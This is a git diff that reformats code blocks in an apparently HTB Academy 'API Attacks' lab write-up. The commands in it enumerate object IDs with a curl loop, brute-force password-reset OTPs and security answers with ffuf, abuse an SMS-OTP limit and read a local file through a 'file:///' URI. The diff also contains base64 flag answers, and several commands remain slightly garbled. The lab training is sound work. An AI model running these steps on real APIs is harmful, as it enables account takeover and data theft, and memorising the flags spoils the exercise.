@@ -99,7 +99,7 @@ curl http://<target-IP>:<target-port> -I
 #### Technical Methodology & Exploit Execution:
 
 we go to the website from the browser to '/swagger':
-http://<target-IP>:<target-port>/swagger
+`http://<target-IP>:<target-port>/swagger`
 and scroll down to roles:
 
 Opening it, we can see there is only one role, with one path:
@@ -138,8 +138,8 @@ And execute:
 
 ### Then – we scroll up to authorized
 
-We get an outfput of the format: '"jwt":"<base64-value>"' – we copy the
-<base64-value>.
+We get an outfput of the format: '"jwt":"`<base64-value>`"' – we copy the
+`<base64-value>`.
 Then – we scroll up to authorized:
 
 And enter the value there – it logs us in:
@@ -162,10 +162,9 @@ Now that we are authenticated, we can run
 ### We will use bash to automate curl from {ID} 1 to 10
 
 We will use bash to automate curl from {ID} 1 to 10:
-for var in {1..10}; do   curl -X 'GET'     "http://<target-
-IP>:<target-port>/api/v1/suppliers/quarterly-reports/$var"
+for var in {1..10}; do   curl -X 'GET'     "http://`<target-IP>`:`<target-port>`/api/v1/suppliers/quarterly-reports/$var"
 -H 'accept: application/json'     -H 'Authorization: Bearer
-<authentication-code>'; done | grep HTB -i
+`<authentication-code>`'; done | grep HTB -i
 and grep for 'HTB', which is constant part of the flag:
 
 *
@@ -215,14 +214,12 @@ We will go for
 #### Technical Methodology & Exploit Execution:
 
 ```bash
-ffuf -u http://<target-IP:<target-
-```
-port>/api/v1/authentication/customers/passwords/resets
--X POST      -H "accept: application/json"      -H "Content-
-Type: application/json"      -d '{"Email":
+ffuf -u http://<target-IP:<target-port>/api/v1/authentication/customers/passwords/resets
+-X POST      -H "accept: application/json"      -H "Content-Type: application/json"      -d '{"Email":
 "MasonJenkins@ymail.com", "OTP": "FUZZ", "NewPassword":
 "jonsnow123"}'      -w /usr/share/seclists/Fuzzing/4-digits-
 0000-9999.txt      -fr "false"
+```
 
 
 
@@ -368,9 +365,7 @@ With requests, we will use the bash script:
 for i in {1..11}; do
 ```bash
 curl -X 'POST' \
-```
-'http://<target-IP>:<target-
-port>/api/v1/authentication/customers/passwords/resets/sms-
+'http://<target-IP>:<target-port>/api/v1/authentication/customers/passwords/resets/sms-
 otps' \
 -H 'accept: application/json' \
 -H 'Content-Type: application/json' \
@@ -378,6 +373,7 @@ otps' \
 "Email": "jonsnow@winterfell.com"
 }'
 done
+```
 which will send a request to the endpoint 11 times
 
 On the 11th request – the system will recognize the overflow and give us the
@@ -406,12 +402,11 @@ GET endpoint.
 And execute the following curl command:
 ```bash
 curl -X 'GET' \
-```
-'http://<target-IP>:<target-
-port>/api/v1/customers/billing-addresses' \
+'http://<target-IP>:<target-port>/api/v1/customers/billing-addresses' \
 -H 'accept: application/json' \
 -H 'Authorization: Bearer <htbpentester9 authentication
 code>' | grep HTB -i
+```
 
 ![Figure 14.1 — Lab execution and output verification (Page 14)](/assets/images/posts/htb-academy/api-attacks/p014_01.jpg)
 *_Figure 14.1 — Lab execution and output verification (Page 14)_*
@@ -430,12 +425,11 @@ code>' | grep HTB -i
 continuing from the previous section's question – we run
 ```bash
 curl -X 'GET' \
-```
-'http://<target-IP>:<target-
-port>/api/v1/customers/billing-addresses' \
+'http://<target-IP>:<target-port>/api/v1/customers/billing-addresses' \
 -H 'accept: application/json' \
 -H 'Authorization: Bearer <htbpentester9 authentication
 code>' | grep daa8c984-ba84-4265-8d88-12d6607e511c -i
+```
 
 
 *
@@ -507,8 +501,8 @@ GET endpoint, and put in it the received productID:
 And we get the base64 encoded flag. We proceed to decode it:
 ```bash
 echo SFRCezNjOTQyMzJjNGYwYjBhNTQ0YWU0MDI0ODMzZWVmMGIzfQo= |
-```
 base64 -d  -H 'accept: application
+```
 
 ![Figure 18.1 — Lab execution and output verification (Page 18)](/assets/images/posts/htb-academy/api-attacks/p018_01.png)
 *_Figure 18.1 — Lab execution and output verification (Page 18)_*
@@ -628,12 +622,11 @@ With it, we can access the suppliers list via the GET endpoint
 We will enumerate the endpoint for suppliers who have their security question
 provided – in an attempt to reset it:
 ```bash
-curl -X 'GET'   'http://<target-IP>:<target-
-```
-port>/api/v2/suppliers'   -H 'accept: application/json'   -H
-'Authorization: Bearer <authentication-payload>' | \
+curl -X 'GET'   'http://<target-IP>:<target-port>/api/v2/suppliers'   -H 'accept: application/json'   -H
+'Authorization: Bearer `<authentication-payload>`' | \
 jq '.suppliers[] | select(.securityQuestion !=
 "SupplierDidNotProvideYet")'
+```
 
 ![Figure 22.1 — Lab execution and output verification (Page 22)](/assets/images/posts/htb-academy/api-attacks/p022_01.jpg)
 *_Figure 22.1 — Lab execution and output verification (Page 22)_*
@@ -648,9 +641,8 @@ jq '.suppliers[] | select(.securityQuestion !=
 #### Technical Methodology & Exploit Execution:
 
 ```bash
-ffuf -u http://<target-IP>:<target-
+ffuf -u http://<target-IP>:<target-port>/api/v2/authentication/suppliers/passwords/resets/secur
 ```
-port>/api/v2/authentication/suppliers/passwords/resets/secur
 ity-question-answers      -X POST      -H "accept:
 application/json"      -H "Content-Type: application/json"
 -d '{"SupplierEmail": "FUZZ", "SecurityQuestionAnswer":
@@ -707,8 +699,8 @@ And we can observe the modification was successful.
 Once the 'ProfessionalCVPDFFileURI' of 'B.Rogers@globalsolutions.com' was
 ```bash
 set to the 'file:///flag.txt' – we will proceed to the GET endpoint
-```
 /api/v2/suppliers/current-user/cv
+```
 To obtain the base64 encoded flag, in the form of the supplier's 'CV' (which
 was modified to the local host flag.txt):
 
@@ -719,8 +711,8 @@ was modified to the local host flag.txt):
 Once we get the base64 encoded flag, we proceed to decode it:
 ```bash
 echo SFRCe2YxOTBiODBjZDU0M2E4NGIyMzZlOTJhMDdhOWQ4ZDU5fQo= |
-```
 base64 -d
+```
 
 ![Figure 25.1 — Lab execution and output verification (Page 25)](/assets/images/posts/htb-academy/api-attacks/p025_01.png)
 *_Figure 25.1 — Lab execution and output verification (Page 25)_*
